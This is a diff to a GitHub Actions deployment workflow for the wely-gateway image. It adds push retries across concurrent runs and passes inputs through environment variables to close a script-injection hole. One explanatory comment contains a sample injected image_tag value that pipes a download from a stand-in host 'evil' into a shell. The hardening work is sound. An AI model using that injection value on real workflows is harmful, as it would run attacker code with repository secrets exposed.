@@ -34,20 +34,54 @@ jobs:
           token: ${{ secrets.INFRA_REPO_TOKEN }}
           path: infra
 
-      - name: Update Image Tag
-        run: |
-          cd infra/overlays/${{ inputs.environment }}
-          kustomize edit set image ghcr.io/welylabs/wely-gateway=ghcr.io/welylabs/wely-gateway:${{ inputs.image_tag }}
-
-      - name: Commit and Push
+      # Seven repositories deploy into this one branch, so several runs reach it at the same
+      # time. The previous version did `git add && git commit && git push` once: whichever run
+      # arrived last had its push rejected as a non-fast-forward, the job failed, and the image
+      # tag it meant to set stayed stale — with every test green, which is the part that makes it
+      # easy to miss. A `concurrency` group cannot fix this: those are scoped per repository, and
+      # the contending runs are in seven different ones.
+      #
+      # So: reset onto the current remote, reapply the tag, push, and retry on rejection. Each
+      # service edits a different image entry, so the contention is on the ref and never on the
+      # content — replaying the edit on top of whatever the other runs wrote always converges.
+      #
+      # The inputs arrive through `env` rather than being interpolated into the script. GitHub
+      # substitutes a ${{ }} expression into the text of the run block *before* the shell sees
+      # it, so an image_tag of `x"; curl evil | sh; "` would execute as part of the script, with
+      # INFRA_REPO_TOKEN in scope — and workflow_dispatch lets a caller choose that value. As
+      # environment variables the shell reads them as data, never as syntax.
+      - name: Set Image Tag and Push
+        env:
+          ENVIRONMENT: ${{ inputs.environment }}
+          IMAGE_TAG: ${{ inputs.image_tag }}
         run: |
           cd infra
           git config user.name "github-actions"
           git config user.email "actions@github.com"
-          if [ -n "$(git status --porcelain)" ]; then
-            git add overlays/${{ inputs.environment }}/kustomization.yaml
-            git commit -m "deploy(${{ inputs.environment }}): update wely-gateway to ${{ inputs.image_tag }}"
-            git push
-          else
-            echo "No changes to commit"
-          fi
+
+          for attempt in 1 2 3 4 5; do
+            ( cd "overlays/$ENVIRONMENT" \
+              && kustomize edit set image \
+                   "ghcr.io/welylabs/wely-gateway=ghcr.io/welylabs/wely-gateway:$IMAGE_TAG" )
+
+            if [ -z "$(git status --porcelain)" ]; then
+              echo "Already at $IMAGE_TAG; nothing to push."
+              exit 0
+            fi
+
+            git add "overlays/$ENVIRONMENT/kustomization.yaml"
+            git commit -m "deploy($ENVIRONMENT): update wely-gateway to $IMAGE_TAG"
+
+            if git push; then
+              echo "Pushed on attempt $attempt."
+              exit 0
+            fi
+
+            echo "Push rejected on attempt $attempt — another run pushed first. Replaying."
+            git fetch origin main
+            git reset --hard origin/main
+            sleep $(( RANDOM % 5 + attempt * 2 ))
+          done
+
+          echo "::error::Could not push the wely-gateway image tag after 5 attempts."
+          exit 1
